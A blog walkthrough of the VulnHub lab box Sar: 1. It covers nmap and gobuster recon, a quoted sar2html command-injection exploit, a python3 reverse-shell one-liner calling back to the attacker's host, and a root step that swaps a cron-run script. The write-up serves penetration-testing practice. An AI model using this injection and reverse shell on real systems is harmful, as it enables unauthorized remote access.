
|[Home](/README.md)|[Projects](/projects.md)|[Articles](/articles.md)|[Apophthegm](/apophthegm.md)|[About](/about.md)|

# **Sar: 1**

Sar is an OSCP-Like VM with the intent of gaining experience in the world of penetration testing.  It is a Linux box and released on Feb 15, 2020.

Download : [Sar: 1](https://www.vulnhub.com/entry/sar-1,425/)  
Format   : VirtualBox (OVA)  
DHCP     : Enabled  

Since the ```netdiscover``` not working properly at my Kali 2020.1, I use ```nmap``` instead to get the IP address of the Sar:1 box which is on ```10.0.2.18```.  My Kali box is on ```10.0.2.24```.

```bash
samiux@kali:~$ nmap 10.0.2.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-09 22:17 HKT
Nmap scan report for 10.0.2.1
Host is up (0.00033s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
53/tcp open  domain

Nmap scan report for 10.0.2.2
Host is up (0.0011s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
631/tcp open  ipp

Nmap scan report for 10.0.2.18
Host is up (0.0012s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 10.0.2.24
Host is up (0.0015s latency).
All 1000 scanned ports on 10.0.2.24 are closed

Nmap done: 256 IP addresses (4 hosts up) scanned in 3.37 seconds
```

Run ```nmap``` for the port scan on the Sar:1 box.

```bash
samiux@kali:~$ nmap -A -p- 10.0.2.18
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-09 22:19 HKT
Nmap scan report for 10.0.2.18
Host is up (0.00094s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.74 seconds
```

The scan reports only port 80 is opened.  Thus, ```gobuster``` is used for the directories of the box.

```bash
samiux@kali:~$ gobuster dir -u http://10.0.2.18 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.18
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,txt
[+] Timeout:        10s
===============================================================
2020/03/09 22:20:54 Starting gobuster
===============================================================
/index.html (Status: 200)
/robots.txt (Status: 200)
/phpinfo.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/03/09 22:26:48 Finished
===============================================================
```

Open the ```Firefox``` to browse on the ```10.0.2.18```.  Then browse ```robots.txt``` also.

![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-001.png)  

![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-002.png)  

The ```robots.txt``` shows ```sar2HTML```.  Browse to it and it shows sar2html application.

![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-003.png)  

Conduct a ```searchsploit``` on Kali box.

![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-004.png)  

The content of the result is :

```bash
# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html 
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute
the command you entered. After command injection press "select # host" then your command's
output will appear bottom side of the scroll screen.
```

Click on ```NEW``` on the left hand side and it shows the url is ```http://10.0.2.18/sar2HTML/index.php?plot=NEW```.

![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-005.png)  

Test it with ```;id``` and found it can execute command ```id```.

![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-006.png)  

After several tries and errors, it is confirmed that ```python3``` and ```bash``` are installed on the box.

![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-007.png)  

## **Reverse shell and user.txt**

Places the following python3 command on the url.

```bash
;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.24",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

And run the listener at another terminal.

```bash
nc -lvp 4444
```

![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-008.png)  

I found out that ```finally.sh``` and ```write.sh``` at ```/var/www/html``` of the box.

![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-009.png)  

![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-010.png)  

After a search on ```/home/love/Desktop```, I found the ```user.txt``` key.

![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-011.png)  

## **Reverse shell and root.txt**

Back to the ```finally.sh``` and ```write.sh```.  After a search, I found ```/etc/crontab``` which runs ```finally.sh``` on every 5 minutes.  However, I cannot see ```gateway``` at ```/tmp``` after 5 minutes.

After thinking of a while, I decided to replace the ```write.sh``` with my own ```write.sh```.  I prepared the ```write.sh``` at ```/var/www/html``` of my Kali box and then starts the Apache2.

![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-012.png)  

Download my own copy of ```write.sh``` to the box and makes it executable.  Prepare another listener at port 7777 on Kali.

![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-013.png)  

After 5 minutes or so, I got the reverse shell and the ```root.txt``` is found on ```/root```.

![](https://raw.githubusercontent.com/samiux/images/master/sar1/sar-014.png)  

Root is dancing!

## **Final thought**

This Capture The Flag (CTF) is based on a realistic vulnerability.  To get the ```root.txt``` is however a little bit tricky.  Anyway, it is a very good box to play with.  Recommended.

Samiux  
OSCE  OSCP  OSWP  
Mar 10, 2020, Hong Kong, China  

|[Home](/README.md)|[Projects](/projects.md)|[Articles](/articles.md)|[Apophthegm](/apophthegm.md)|[About](/about.md)|
